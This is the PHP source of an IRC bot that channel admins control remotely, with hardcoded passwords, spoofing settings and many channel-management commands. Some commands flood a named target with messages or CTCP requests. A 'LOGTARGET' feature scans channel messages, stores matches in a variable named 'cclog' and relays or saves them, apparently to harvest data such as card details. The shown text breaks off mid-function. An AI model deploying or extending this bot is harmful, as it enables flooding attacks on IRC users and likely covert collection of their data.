<?php
/*
+---------------------------------------------------------------------------
|   PHP-BOT hardened by D3DY aka CaPoeNK
+---------------------------------------------------------------------------
*/

#######################
set_time_limit(0);
define ('CRLF', "\r\n");
$modbot=new module_bot;
#######################

#################### [ CONFIG BOT ] #######################
$bot['admin']="D3DY";
$bot['pass']="pler";
$bot['inick']="identnick";
$bot['pnick']="passwordnick";
$bot['basechan']="#pokerkingme";
$bot['local']="localhost";
$bot['server']="film.byroe.net";
$bot['port']=6667;
$bot['userver']=0;
$bot['pserver']="remotepass";
/////////////////////////////////////
$bot['nick']=$modbot->rnd_nick();
$bot['ident']=$modbot->rnd_ident();
$bot['realname']=$modbot->rnd_real();

################# [ END CONFIG BOT ] ######################

#################### [ AUTH VAR ] #########################
$Admin=strtolower($bot['admin']);
$BOT_PASSWORD=strtolower($bot['pass']);
$auth = array($Admin => array("name" => $Admin, "pass" => $BOT_PASSWORD, "auth" => 1,"status" => "Owner","ident"=>"","host"=>"","time",""));
################## [ END AUTH VAR ] #######################

###################### [ VAR VAR ] ########################
$tsu=array("`","|","[","]","{","}","^","\\","_");
$zodiak = array("capricorn", "aquarius", "pisces", "aries", "taurus", "gemini", "cancer", "leo", "virgo", "libra", "scorpio", "sagitarius");
$ctcpversi="php bot by ipays";
$ctcpfinger="?";
$user_chan_arr[][]="";

$greetmsg["nick"]["nama"]="";
$greetmsg["nick"]["msg"]="";

$banlist[$bot['basechan']]="";
$ping["ping"]["nick"]="";
$ping["ping"]["chan"]="";

$jmlspoof["irc.ads.net.id"]=0;
$isisp[1]["irc.ads.net.id"]["ident"]="gw";
$isisp[1]["irc.ads.net.id"]["spoof"]="hantu.rese.a.biz";
$isisp[1]["irc.ads.net.id"]["pass"]="spoof1";

$kmusedan[0]["contoh"][]="";
$kmusedan[0]["definisi"][]="";
$kmusedan[0]["kata"][]="";
$kmjml["apa"]="";

$chanson=strtolower($bot['basechan']);
$listison[0]=strtolower($bot['admin']);
$ada1[$listison[0]]=false;
$ada2[$listison[0]]=true;

$goboom=0;$tmboom=0;$onboom="off";$targetboom="";$warnabenar="";$bw[0]="";$chanboom="";$timeboom=30;
$warnaboom="Merah;Kuning;Hijau;Ungu;Coklat;Hitam;Putih;Abu-abu;Emas;Silver;Maroon;Jingga;Orange";

$systembot['ping'][strtolower($bot['basechan'])]="4OFF";
////////////////////
$iscy=time();
$timercy=2000;
$intamsg=0;
$listamsg[0]="";
$intaact=0;
$listaact[0]="";
$timeramsg=3600;
$timeraact=3600;
#################### [ END VAR VAR ] ######################

##################### [ CONNECT ] #####################
/////////////////
$servdef=array("irc.indika.net.id","dustshell.us.allnetwork.org","irc.plasa.com","irc.indo.net.id","irc.ads.net.id","irc.hotspeed.com.sg","irc.elnus.net.id","irc.jmn.net.id","irc.punc4k.com","velo.id.allnetwork.org","irc.allnetwork.org","irc.sbp.net.id"
               );
$keluar=0;$retry=count($servdef)+1;$attconnect=0;$rtdc=0;
/////////////////
do {
    $fp = fsockopen($bot['server'],$bot['port'], &$err_num, &$err_msg, 30);
    if(!$fp) {
	$attconnect++;
	print "Sorry, the server " . $bot['server']. " is not currently available!".CRLF;
	$bot['server']=$servdef[$attconnect-1];
	$bot['userver']=0;
	sleep(5);
	if ($attconnect >=$retry){
		$keluar=1;
		exit;
	}
    }
    else{
        $inaway['status']=0;
        $haltfl['on']=0;
        $res_chan="";
        $res_chan=$modbot->show_chan();
	$modbot->destroy_allchan();
        $attconnect=0;$rtdc++;
        if($rtdc ==3){$bot['userver']=0;}elseif($rtdc >=4){$bot['ident']="hune";$bot['userver']=0;$rtdc=0;}
        
        ####### REGISTER TO SERVER ########
        if ($bot['userver']==1){$Header = 'PASS ' . $bot['pserver'] . CRLF;}
        $Header .= 'NICK ' . $bot['nick'] . CRLF;
	$Header .= 'USER ' . $bot['ident'] . ' ' . $bot['local'] . ' ' . $bot['server'] . ' :' . $bot['realname'];
        $modbot->send($fp,$Header);
        $Header="";
        unset ($Header);
        #### END REGISTER ################
        $response = '';
        while (!feof($fp)) {
            #### MAIN ITUNG_ITUNGAN ###
            
            if(time()-$haltfl['time']>15 && $haltfl['on']==1){$haltfl['on']=0;$haltfl['time']=time();}
            if(time()-$isontime >15 && $systembot['ISON']['ALL']=="3ON"){$modbot->send($fp,"ISON ". $modbot->show_ison());$isontime=time();}
            if($systembot['AUTOAWAY']['ALL']=="3ON" && $inaway['status']==0){if(time()-$inaway['idle'] >=1800){$modbot->away($fp,$modbot->rnd_logo().' '.$modbot->rnd_away());$inaway['status']=1;$inaway['idle']=time();}}
            if(time()-$iscy >$timercy){$modbot->auto_cy($fp);$iscy=time();}
            if($onboom=="on"){
                $tboom=time()-$tmboom;
		if($tboom>=$timeboom){
                $modbot->kick($fp,$chanboom,$targetboom,'0,4Waktu Habis Cuoooooookk... BOOOOOOMMMM!!!!!');
		$goboom=0;$onboom="off";$targetboom="";
                }
            }
	    if(time()-$isamsg >$timeramsg){$modbot->mod_automsg($fp);$isamsg=time();}
            if(time()-$isaact >$timeraact){$modbot->mod_autoact($fp);$isaact=time();}
            #### MAIN ITUNG_ITUNGAN ###
            
            ##[ Proses Data Recv ]##
            $response = fgets($fp, 1024);
            while (substr_count($response,CRLF) != 0) {
                $offset = strpos($response, CRLF);
		$DataLine = substr($response,0,$offset);
                if (substr($DataLine,0,1) == ':') {
                    $Params=explode(" ",$DataLine);
		    $offsetC = strpos($DataLine, ' :');
                    $dText = substr($DataLine,$offsetC+2);
                        if ((strpos($Params[0],"!")!=0) && (strpos($Params[0],"@")!=0) ) {
                            $fsrc[nick]=substr($Params[0],1,strpos($Params[0],"!")-1);
                            $fsrc[nkecil]=strtolower($fsrc[nick]);
                            $fsrc[user]=substr($Params[0],strpos($Params[0],"!")+1,(strpos($Params[0],"@")-strpos($Params[0],"!"))-1);
                            $fsrc[host]=substr($Params[0],strpos($Params[0],"@")+1);
			}
                        ##[ MEMULAI DATA RAW ]##
                        switch ($Params[1]){
                            case "001":
                                $bot['nick']=$Params[2];$rtdc=0;
                                break;
                            case "004":
                                $modbot->msg($fp,"Nickserv",'identify '.$bot['inick']. ' '. $bot['pnick']);
                                $modbot->msg($fp,"Nickserv",'identify '. $bot['pnick']);sleep(1);
                                $modbot->join($fp,$bot['basechan']);
                                sleep(2);
                                if($res_chan){$arres_chan=explode(";",$res_chan);foreach ($arres_chan as $clist){$modbot->join($fp,$clist,"");sleep(2);}}
                                break;
                            case "303":
                                $modbot->stuf_ison($fp,$dText);
                                break;
                            case "305":
                                $inaway['status']=0;
                                break;
                            case "306":
                                $inaway['status']=1;
                                break;
                            case "353":
                                $nickll=str_replace("@","",$dText);$nickll=str_replace("%","",$nickll);$nickll=str_replace("+","",$nickll);
                                $modbot->destroy_chan($Params[4]);$modbot->add_nickchan($Params[4],$nickll);
                                break;
                            case "367":
                                $modbot->notice($fp,$banlist["$Params[3]"],'4[3+b4] 1- 3'.$Params[4].'');
                                break;
                            case "368":
                                $modbot->notice($fp,$banlist["$Params[3]"],'4E1nd 4o1f 4c1hannel 4b1an 4l1ist');
				unset($banlist["$Params[3]"]);
                                break;
                            case "432":
                                if($haltfl['on']==0){$modbot->nick($fp,$bot['nick'].$modbot->rand_str(4));}
                                break;
                            case "433":
                                if($haltfl['on']==0){$modbot->nick($fp,$bot['nick'].$modbot->rand_str(4));}
                                break;
                            case "464":
                                $bot['userver']=0;
                                break;
                            case "465":
                                $bot['userver']=0;
                                break;
                            case "NICK":
                                $newnicke = str_replace(':','',$Params[2]);
                                if($modbot->is_loginbot($fsrc[nick],$fsrc[user],$fsrc[host])==1){
                                    $modbot->logoutbot($fsrc[nick]);$modbot->notice($fp,$newnicke,'You`re LogOut On Change Nick!');
                                }
                                if($fsrc[nkecil]==strtolower($bot['nick'])){$bot['nick']=$newnicke;}
				$modbot->change_nickchan($fsrc[nick],$newnicke);
                                break;
                            case "JOIN":
                                $addchan=str_replace(":","",$Params[2]);
                                $modbot->add_nickchan($addchan,$fsrc[nick]);
                                                ////////////////
                                                if($fsrc[nkecil]==strtolower($greetmsg["$fsrc[nkecil]"]["nama"]) && $systembot['GREET'][strtoupper($addchan)]=="3ON"){
							$rndgreet=explode("[NG]",$greetmsg["$fsrc[nkecil]"]["msg"]);
							$msgrndgreet=$rndgreet[rand(0,count($rndgreet) - 1)] ;
							$addchan=str_replace(":","",$Params[2]);
							$msgnya=str_replace("<|nick|>",$fsrc[nick],$msgrndgreet);
							$msgnya=str_replace("<|chan|>",$addchan,$msgnya);
                                                        $modbot->msg($fp,$addchan,$msgnya);
						}
                                                ////////////////
                                break;
                            case "PART":
                                if($modbot->is_loginbot($fsrc[nick],$fsrc[user],$fsrc[host])==1){
                                    $modbot->logoutbot($fsrc[nick]);$modbot->notice($fp,$fsrc[nick],'You`re LogOut On Parting Channel!');
                                }
                                if($fsrc[nkecil]==strtolower($bot['nick'])){$modbot->destroy_chan($Params[2]);}
				else{$modbot->del_nickchan($Params[2],$fsrc[nick]);}
                                break;
                            case "KICK":
                                if(strtolower($bot['nick'])==strtolower($Params[3])){
                                    $modbot->destroy_chan($Params[2]);
                                    if($systembot['AUTOJOIN'][strtoupper($Params[2])]=='3ON'){sleep(1);$modbot->msg($fp,"Chanserv",'UNBAN '.$Params[2].' '.$bot['nick']);sleep(1);$modbot->join($fp,$Params[2]);}
                                }
                                else{ $modbot->del_nickchan($Params[2],$Params[3]);}
                                break;
                            case "QUIT":
                                $modbot->change_nickchan($fsrc[nick],"");
                                if($modbot->is_loginbot($fsrc[nick],$fsrc[user],$fsrc[host])==1){$modbot->logoutbot($fsrc[nick]);}
                                break;
                            case "NOTICE":
				if($fsrc[nkecil]=="nickserv" && strpos($dText,"/msg NickServ identify") && strpos($dText,"already registered.")){
                                    $modbot->msg($fp,"Nickserv",'identify '.$bot['inick']. ' '. $bot['pnick']);
                                    $modbot->msg($fp,"Nickserv",'identify '. $bot['pnick']);sleep(1);
                                }
                                if($Params[3]==':PING'){
                                   $modbot->stuf_lag($fp,$fsrc[nick],$Params[4]); 
                                }
                                if($Params[3]==':VERSION'){
                                    if($datversi[strtolower($fsrc[nick])]["nick"]==strtolower($fsrc[nick])){
					$vernya=str_replace(chr(1),"",$dText);$vernya=substr($vernya,8);
                                        $modbot->msg($fp,$datversi[strtolower($fsrc[nick])]["chan"],'15(04Info15) 7'.$fsrc[nick].' '.$vernya);
                                    }
                                    unset($datversi[strtolower($fsrc[nick])]["nick"]);unset($datversi[strtolower($fsrc[nick])]["chan"]);
				}
                                if($Params[3]==':FINGER'){
                                    if($datfinger[strtolower($fsrc[nick])]["nick"]==strtolower($fsrc[nick])){
					$vernya=str_replace(chr(1),"",$dText);$vernya=substr($vernya,7);
                                        $modbot->msg($fp,$datfinger[strtolower($fsrc[nick])]["chan"],'15(04Info15) 7'.$fsrc[nick].' '.$vernya);
                                    }
                                    unset($datfinger[strtolower($fsrc[nick])]["nick"]);unset($datfinger[strtolower($fsrc[nick])]["chan"]);
				}
                                if($Params[3]==':TIME'){
                                    if($dattime[strtolower($fsrc[nick])]["nick"]==strtolower($fsrc[nick])){
					$timenya=str_replace(chr(1),"",$dText);$timenya=substr($timenya,5);
                                        $modbot->msg($fp,$dattime[strtolower($fsrc[nick])]["chan"],'15(04Info15) 7'.$fsrc[nick].' '.$timenya);
                                    }
                                    unset($dattime[strtolower($fsrc[nick])]["nick"]);unset($dattime[strtolower($fsrc[nick])]["chan"]);
                                }
                                break;
                            case "PRIVMSG":
                                $TxtMsg=substr($DataLine,strpos($DataLine," :")+2);
                                unset($dCom);$dCom=explode(" ", $TxtMsg);$perintah=strtolower($dCom[0]);
                                if($haltfl['on']==0){
                                if ( $Params[3]==":PING") {$modbot->notice($fp,$fsrc[nick],$TxtMsg);}
                                elseif ($Params[3]==":VERSION") { $modbot->notice($fp,$fsrc[nick],chr(1) . 'VERSION '. $ctcpversi . chr(1));}
                                elseif ($Params[3]==":FINGER") { $modbot->notice($fp,$fsrc[nick],chr(1) . 'FINGER '. $ctcpfinger . chr(1));}
                                elseif ($Params[3]==":TIME") { $timetoday = date("D M j H:i:s Y"); $modbot->notice($fp,$fsrc[nick],chr(1) . 'TIME '.$timetoday . chr(1));}
				elseif ($Params[3]==":INFO") { if($modbot->is_loginbot($fsrc[nick],$fsrc[user],$fsrc[host])){ $modbot->botinfo($fp,$fsrc[nick],$Params[4]);	}}
                                }
				if($systembot['LOGTARGET'][strtoupper($Params[2])]=='3ON'){
					$cclog=$modbot->caritarget($TxtMsg);
					if ($cclog){
						if($targetinchan==1){$modbot->msg($fp,$chanlogtarget,$cclog);}
						if($targetinsite==1){$modbot->savex("unk",$cclog);}
					}
				}
                                ################ ANTI SLAPS ############
                                if($Params[3]==':ACTION' && ereg('#',$Params[2]) && $systembot['SLAPS'][strtoupper($Params[2])]=="3ON"){
                                    if(strpos(strtolower($TxtMsg),"slaps") || strpos(strtolower($TxtMsg),"slap")){
                                        foreach ($auth as $ulist) {if($ulist["name"]){if(strpos(strtolower($TxtMsg),strtolower($ulist["name"]))){$onbos=1;}}}
                                        if($modbot->is_loginbot($fsrc[nick],$fsrc[user],$fsrc[host])==1){$onbos=0;}
                                        if($onbos==1){$modbot->kick($fp,$Params[2],$fsrc[nick],$modbot->rnd_slapbos());}
                                        elseif($onbos==0){if(strpos(strtolower($TxtMsg),strtolower($bot['nick']))){$modbot->msg($fp,$Params[2],$modbot->rnd_slapampun());}}
                                        else{if(strpos(strtolower($TxtMsg),strtolower($bot['nick']))){$modbot->kick($fp,$Params[2],$fsrc[nick],$modbot->rnd_slapme());}}
                                        $onbos=2;
                                    }
                                }
                                ############ END ANTI SLAPS ############
                                if (substr($Params[3],0,2)==':^'){
                                    $logok=$modbot->is_loginbot($fsrc[nick],$fsrc[user],$fsrc[host]);
                                    if (strtolower($dCom[0])=='^login' && $dCom[1]) {
                                        if($logok==1){$modbot->notice($fp,$fsrc[nick],"You`re Already Authorized!");}
                                        else{
                                            if($haltfl['on']!=0){sleep(2);};
                                            if($modbot->loginbot($fsrc[nick],$fsrc[user],$fsrc[host],$dCom[1])==1){
                                                $modbot->notice($fp,$fsrc[nick],'You`re Authorized As '.$auth["$fsrc[nkecil]"]["status"].'!');
                                                $modbot->notice($fp,$fsrc[nick],'For help type .help');
                                                $auth["$fsrc[nkecil]"]["ident"]=$fsrc[user];$auth["$fsrc[nkecil]"]["host"]=$fsrc[host];
                                                if($systembot['AUTOAWAY']['ALL']=="3ON" && $inaway['status']==1){$inaway['idle']=time();$inaway['status']=0;$modbot->noaway($fp);}
                                            }
                                        }
                                   }
                                   elseif (strtolower($dCom[0])=='^logout' && $logok==1) {
                                    if($modbot->logoutbot($fsrc[nick])==1){$modbot->notice($fp,$fsrc[nick],'You`re LogOut!');}
                                   }
                                }
                                elseif (substr($Params[3],0,2)==':.'){
                                    if($modbot->is_loginbot($fsrc[nick],$fsrc[user],$fsrc[host])){
                                        if (ereg('#',$Params[2])){$cmdin=1;$target=$Params[2];}else {$cmdin=2;$target=$fsrc[nick];}
                                        $getlvl=$modbot->level_user($fsrc[nick]);
                                        if($systembot['AUTOAWAY']['ALL']=="3ON" && $inaway['status']==1){$inaway['idle']=time();$inaway['status']=0;$modbot->noaway($fp);}

					
                                        ############### MULTI USER BOT ##############
                                        if ($perintah=='.chgpass' && $dCom[1] && $dCom[2]) {
                                            $modbot->chgpass_user($fp,$fsrc[nick],$dCom[1],$dCom[2]);
                                        }
                                        elseif ($perintah=='.adduser' && $dCom[1] && $dCom[1]!=$bot['nick'] && $dCom[2] && $dCom[3] && $getlvl > 1) {

                                            $modbot->add_user($fp,$fsrc[nick],$dCom[1],$dCom[2],$dCom[3]);
                                        }
                                        elseif ($perintah=='.deluser' && $dCom[1] && $getlvl > 1) {
                                            $modbot->del_user($fp,$fsrc[nick],$dCom[1]);
                                        }
                                        ############# END MULTI USER BOT ############
                                        
                                        ########## CHANGE SERVER IDENT REALNAME SERVPASS && JUMP ########
                                        elseif ($perintah=='.server' && $dCom[1] && $getlvl > 2){
                                            $bot['server']=$dCom[1];$modbot->notice($fp,$fsrc[nick],'ChANging SeRVeR To '. $dCom[1]);
                                        }
                                        elseif ($perintah=='.servpass' && $dCom[1] && $getlvl > 2){
                                            $bot['pserver']=$dCom[1];$bot['userver']=1;
                                            $modbot->notice($fp,$fsrc[nick],'ChANging PassWOrD SeRVeR To '. $dCom[1]);
                                        }
                                        elseif ($perintah=='.ident' && $dCom[1] && $getlvl > 2){
                                            $bot['ident']=$dCom[1];$modbot->notice($fp,$fsrc[nick],'ChANging IdentD To '. $dCom[1]);
                                        }
                                        elseif ($perintah=='.vhost' && $dCom[1] && $getlvl > 2){
                                            $bot['local']=$dCom[1];$modbot->notice($fp,$fsrc[nick],'ChANging VhosT To '. $dCom[1]);
                                        }
                                        elseif ($perintah=='.realname' && $dCom[1] && $getlvl > 2){
                                            $Rmsg=substr($TxtMsg,10);$Rmsg=ltrim($Rmsg);$bot['realname']=$Rmsg;
                                            $modbot->notice($fp,$fsrc[nick],'ChANging ReaLNaMe To '. $Rmsg);
                                        }
                                        elseif ($perintah=='.jump' && $getlvl > 2){
                                            $keluar = 0;$modbot->quit($fp,'changing servers');
                                        }
                                        ########################## END CHG SER IDENT REAL ##########################
                                        
                                        ################################ #### ##################################
					elseif ($perintah=='.loadbot' && $getlvl > 1){
						$kata=$modbot->botload($dCom[1],$dCom[2]);
						$modbot->msg($fp,$target,$kata);
					}
                                        elseif ($perintah=='.botnick' && $getlvl > 1) {
                                                $modbot->notice($fp,$fsrc[nick],'My Nick Is :'.$bot['nick']);
                                        }
                                        elseif ($perintah=='.identnick' && $dCom[1] && $dCom[2] && $cmdin==2 && $getlvl > 1){
                                                $bot['inick']=$dCom[1];$bot['pnick'] = $dCom[2];
                                                $modbot->msg($fp,"Nickserv",'identify '.$bot['inick']. ' '. $bot['pnick']);
                                                $modbot->msg($fp,"Nickserv",'identify '. $bot['pnick']);
                                                $modbot->notice($fp,$fsrc[nick],"Identify nick... to ".$dCom[1]);
                                        }
                                        elseif ($perintah=='.logoutnick' && $getlvl > 1){
                                                $modbot->msg($fp,"Nickserv","logout");$modbot->notice($fp,$fsrc[nick],"Logout nick");
                                        }
                                        elseif ($perintah=='.basechan' && $dCom[1] && $getlvl > 2){
                                                $bchan=$dCom[1];if (!ereg("#",$dCom[1])) { $bchan="#".$dCom[1]; }
                                                $modbot->part($fp,$bot['basechan'],$modbot->rnd_logo() . ' BaseChan cHanGE by ' . $frsc[nick]);
                                                $bot['basechan']=$bchan;$modbot->join($fp,$bot['basechan']);
                                        }
                                        elseif ($perintah=='.userlist' && $getlvl > 1) {
                                            $modbot->notice($fp,$fsrc[nick],'User List: '.$modbot->user_list($fp,$fsrc[nick]));
                                        }
                                        elseif ($perintah=='.chanlist' && $getlvl > 2) {
                                            $datachan=str_replace(";"," ",$modbot->show_chan());$modbot->notice($fp,$fsrc[nick],$datachan);$datachan="";unset($datachan);
                                        }
                                        elseif ($perintah=='.nicklist' && $dCom[1] && $getlvl > 2) {
                                            $nchan=$dCom[1];if (!ereg("#",$dCom[1])) { $nchan="#".$dCom[1]; }
                                            $datanick=explode(" ",$modbot->show_nickchan($nchan));
                                            for ($i = 0; $i <= count($datanick); $i++) {
                                                $limitshow++;$lnick_x=$lnick_x.' '.$datanick[$i];
                                                if($limitshow==15){
                                                    $lnick_x=ltrim($lnick_x);$lnick_x=rtrim($lnick_x);$modbot->notice($fp,$fsrc[nick],$lnick_x);
                                                    $limitshow=0;$lnick_x="";
                                                }
                                            }
                                            $lnick_x=ltrim($lnick_x);$lnick_x=rtrim($lnick_x);
                                            if($lnick_x){$modbot->notice($fp,$fsrc[nick],$lnick_x);}$lnick_x="";
                                            unset($lnick_x);unset($datanick);
                                        }
                                        elseif ($perintah=='.showison' && $getlvl > 2) {$modbot->notice($fp,$fsrc[nick],$modbot->show_ison());}
                                        elseif ($perintah=='.chanison' && $getlvl > 2) {$chanson=$dCom[1];$modbot->notice($fp,$fsrc[nick],'ChanIson cHanGe To '.$dCom[1]);}
                                        elseif ($perintah=='.settimercycle' && $dCom[1] && $getlvl > 2) {
                                                $timercy=$dCom[1];
                                                $modbot->notice($fp,$fsrc[nick],'Timer aUtO Cycle cHanGe To '.$dCom[1].' Second');
                                        }
                                        elseif ($perintah=='.settimermsg' && $dCom[1] && $getlvl > 2) {
                                                $timeramsg=$dCom[1];
                                                $modbot->notice($fp,$fsrc[nick],'Timer AutoMsg cHanGe To '.$dCom[1]. ' Second');
                                        }
                                        elseif ($perintah=='.settimeract' && $dCom[1] && $getlvl > 2) {
                                                $timeraact=$dCom[1];
                                                $modbot->notice($fp,$fsrc[nick],'Timer AutoAction cHanGe To '.$dCom[1]. ' Second');
                                        }
                                        elseif($perintah=='.setversion' && $dCom[1] && $getlvl > 2){
                                                $Rmsg=substr($TxtMsg,12);$Rmsg=ltrim($Rmsg);$ctcpversi=$Rmsg;
                                                $modbot->notice($fp,$fsrc[nick],'VerSIoN cHanGe To '.$ctcpversi);
                                        }
                                        elseif($perintah=='.setfinger' && $dCom[1] && $getlvl > 2){
                                                $Rmsg=substr($TxtMsg,12);$Rmsg=ltrim($Rmsg);$ctcpfinger=$Rmsg;
                                                $modbot->notice($fp,$fsrc[nick],'FiNGeR cHanGe To '.$ctcpfinger);
                                        }
					elseif ($perintah=='.chanlogtarget' && $dCom[1] && $getlvl > 2) {
						$nchan=$dCom[1];if (!ereg("#",$dCom[1])) { $nchan="#".$dCom[1]; }
						$chanlogtarget=$nchan;
						$modbot->notice($fp,$fsrc[nick],'ChANging ChANnel LogTarget to '. $nchan);
					}
                                        ################################ #### ##################################
                                        
                                        
                                        ######################### CONTROL BOT #######################
                                        elseif ($perintah=='.up' && $getlvl > 1 && $cmdin==1) {
                                            $modbot->msg($fp,"Chanserv",'Op '.$Params[2].' '.$bot['nick']);
                                        }
                                            elseif ($perintah=='.down' && $getlvl > 1 && $cmdin==1) {
                                            $modbot->mode($fp,"+v-ho",$Params[2],$bot['nick'].' '.$bot['nick'].' '.$bot['nick']);
                                            }
                                            elseif ($perintah=='.o' || $perintah=='.h' || $perintah=='.v' || $perintah=='.do' || $perintah=='.dh' || $perintah=='.dv'){
                                                if ($getlvl > 1){
                                                    if ($perintah=='.o' || $perintah=='.h' || $perintah=='.v'){
                                                        $moden=strtolower(substr($dCom[0],1));$moden='+'.$moden . $moden . $moden;
                                                    }
                                                    elseif ($perintah=='.do' || $perintah=='.dh' || $perintah=='.dv'){
                                                        $moden=strtolower(substr($dCom[0],2));$moden='-'.$moden . $moden . $moden;
                                                    }
                                                    if ($cmdin==1){$ttarget=$Params[2];$tforce=$dCom[1];$tmore=$dCom[2].' '.$dCom[3];}
                                                    elseif($cmdin==2){$ttarget=$dCom[1];$tforce=$dCom[2];$tmore=$dCom[3].' '.$dCom[4];}
                                                    if ($tforce) { $vonick = $tforce; }else { $vonick = $fsrc[nick]; }
                                                    $modbot->mode($fp,$moden,$ttarget,$vonick.' '.$tmore);
                                                }
                                            }
                                            elseif ($perintah=='.k' || $perintah=='.kb' || $perintah=='.kc') {
                                                if($dCom[1] && $getlvl > 1){
                                                    if ($cmdin==1){$tdata=$dCom[1];$ttarget=$Params[2];$tkode=$dCom[0].' '.$dCom[1];}
                                                    elseif($cmdin==2){$tdata=$dCom[2];$ttarget=$dCom[1];$tkode=$dCom[0].' '.$dCom[1].' '.$dCom[2];}
                                                    $msg=substr($TxtMsg,strlen($tkode)+1); $msg=ltrim($msg);$msg=rtrim($msg);
                                                    if($perintah=='.k'){
                                                        $modbot->kick($fp,$ttarget,$tdata,$msg);
                                                    }
                                                    elseif($perintah=='.kb'){
                                                        $modbot->ban($fp,$ttarget,$tdata);$modbot->kick($fp,$ttarget,$tdata,$msg);
                                                    }
                                                    elseif($perintah=='.kc'){$modbot->kickserv($fp,$ttarget,$tdata,$msg);}
                                                }
                                            }
                                            elseif ($perintah=='.b' || $perintah=='.ub') {
                                                if($getlvl > 1){
                                                    if ($cmdin==1){$ttarget=$Params[2];$tkode=$dCom[0];}
                                                    elseif($cmdin==2){$ttarget=$dCom[1];$tkode=$dCom[0].' '.$dCom[1];}
                                                    $tmode=substr($TxtMsg,strlen($tkode)+1);
                                                    $tmode=ltrim($tmode);$tmode=rtrim($tmode);
                                                    if($perintah=='.b'){$modbot->ban($fp,$ttarget,$tmode);}
                                                    else{$modbot->unban($fp,$ttarget,$tmode);}
                                                }
                                            }
                                            elseif ($perintah=='.j' && $dCom[1]) {
                                                $jchan=$dCom[1];if (!ereg("#",$dCom[1])) { $jchan="#".$dCom[1]; }
                                                $modbot->join($fp,$jchan,$dCom[2]);
                                            }
                                            elseif ($perintah=='.p' && $dCom[1]) {
                                                $pchan=$dCom[1];
                                                if (!ereg("#",$dCom[1])) { $pchan="#".$dCom[1]; }
                                                $pmsg=substr($TxtMsg,3+strlen($dCom[1])+1);
                                                $modbot->part($fp,$pchan,$pmsg);
                                            }
                                            elseif ($perintah=='.cy' && $dCom[1]) {
                                                $pchan=$dCom[1];
                                                if (!ereg("#",$dCom[1])) { $pchan="#".$dCom[1]; }
                                                $pmsg=substr($TxtMsg,4+strlen($dCom[1])+1);
                                                $modbot->Cycle($fp,$pchan,$pmsg);
                                            }
                                            elseif ($perintah=='.a' || $perintah=='.s') {
                                                if($dCom[1] && $getlvl > 1){
                                                    if ($cmdin==1){$ttarget=$Params[2];$tkode=$dCom[0];}
                                                    elseif($cmdin==2){$ttarget=$dCom[1];$tkode=$dCom[0].' '.$dCom[1];}
                                                    $msg=substr($TxtMsg,strlen($tkode)+1);
                                                    if($perintah=='.a'){$modbot->act($fp,$ttarget,$msg);
                                                    }else{$modbot->msg($fp,$ttarget,$msg);}
                                                }
                                            }
                                            elseif ($perintah=='.away'){
                                                if($dCom[1]){$modbot->away($fp,substr($TxtMsg,6));}else{$modbot->noaway($fp);}
                                            }
                                            elseif ($perintah=='.n' && $dCom[1]){$modbot->nick($fp,$dCom[1]);}
                                            elseif ($perintah=='.q' && $getlvl > 3 ){
                                            $keluar=1;if($dCom[1]){$Qmsg=substr($TxtMsg,3);}$modbot->quit($fp,$Qmsg);$keluar=1;sleep(3);exit;
                                            }
                                            
                                            elseif ($perintah=='.ts' && $dCom[1] && $getlvl > 2){
                                                $modbot->flood($fp,$dCom[1],$TxtMsg);
                                            }
					    elseif ($perintah=='.tsc' && $dCom[1] && $getlvl > 2){
                                                $modbot->floodctctp($fp,$dCom[1]);
					    }
                                            elseif($perintah=='.help'){
                                                $modbot->mod_help($fp,$fsrc[nick]);
                                            }
                                            ###################### END CONTROL BOT #####################
                                            
                                            ################################ SYSTEM ###################################
                                            elseif ($perintah=='.status' && $getlvl > 2 && $cmdin==1 ){
                                                if($dCom[1]){$chan=$dCom[1];}
                                                else{$chan=$Params[2];}
                                                if (!ereg("#",$chan)){$chan="#".$chan;}
                                                $chan=strtoupper($chan);
                                                $modb="";
                                                if($systembot['TIME'][$chan]=="3ON"){$modb.=' [4T]iME';}
                                                if($systembot['ASTRO'][$chan]=="3ON"){$modb.=' [4A]sTRo';}
                                                if($systembot['PING'][$chan]=="3ON"){$modb.=' [4P]iNG';}
                                                if($systembot['BOM'][$chan]=="3ON"){$modb.=' [4B]oM';}
                                                if($systembot['SPOOF'][$chan]=="3ON"){$modb.=' SPoo[4F]';}
                                                if($systembot['GOOGLE'][$chan]=="3ON"){$modb.=' [4G]oogle';}
                                                if($systembot['IMAGE'][$chan]=="3ON"){$modb.=' I[4M]age';}
                                                if($systembot['CALC'][$chan]=="3ON"){$modb.=' Ca[4L]c';}
                                                if($systembot['VIDEO'][$chan]=="3ON"){$modb.=' ViDe[4O]';}
                                                if($systembot['KSLANG'][$chan]=="3ON"){$modb.=' [4K]SlaNG';}
                                                if($systembot['VERSION'][$chan]=="3ON"){$modb.=' V[4E]rSIoN';}
                                                if($systembot['FINGER'][$chan]=="3ON"){$modb.=' [4F]iNGeR';}
                                                if($systembot['ISON']['ALL']=="3ON"){$modb.=' [4I]soN';}
                                                if($systembot['GREET'][$chan]=="3ON"){$modb.=' [4G]rEEt';}
                                                if($systembot['AUTOAWAY']['ALL']=="3ON"){$modb.=' AUtoA[4W]ay';}
                                                if($systembot['AUTOCYCLE'][$chan]=="3ON"){$modb.=' AuTO[4C]YcLE';}
						if($systembot['AUTOMSG'][$chan]=="3ON"){$modb.=' AuTO[4M]sG';}
                                                if($systembot['AUTOACT'][$chan]=="3ON"){$modb.=' AuTOAct[4I]On';}
                                                if($systembot['AUTOJOIN'][$chan]=="3ON"){$modb.=' AuTo[4J]oIN';}
                                                $modb=ltrim($modb);
                                                $modb=rtrim($modb);
                                                if($modb==""){$modb="[4PA]RKiR [4NI]c[4K]";}
                                                $modbot->act($fp,$Params[2],'iS MODeS '.$modb.' FoR [2'.strtoupper($chan).']');
                                            }
                                        elseif (substr($perintah,0,2)=='.+' || substr($perintah,0,2)=='.-'){
                                            if(substr($perintah,1,1)=='+'){$onoff="3ON";}elseif(substr($perintah,1,1)=='-'){$onoff="4OFF";};
                                            $wsys=substr(strtoupper($perintah),2);
                                            if($cmdin==1){$targetsys=$Params[2];if($dCom[1]){$targetsys=$dCom[1];}$sysok=1;}
                                            elseif($cmdin==2 && $dCom[1]){$targetsys=$dCom[1];$sysok=1;}
                                            if (!ereg("#",$targetsys)){$targetsys="#".$targetsys;}
                                            if($wsys=='PING' && $sysok==1 && $getlvl > 2){
                                                $systembot['PING'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'PING '. strtoupper($targetsys).' is [4'.strtoupper($systembot['PING'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='VERSION' && $sysok==1 && $getlvl > 2){
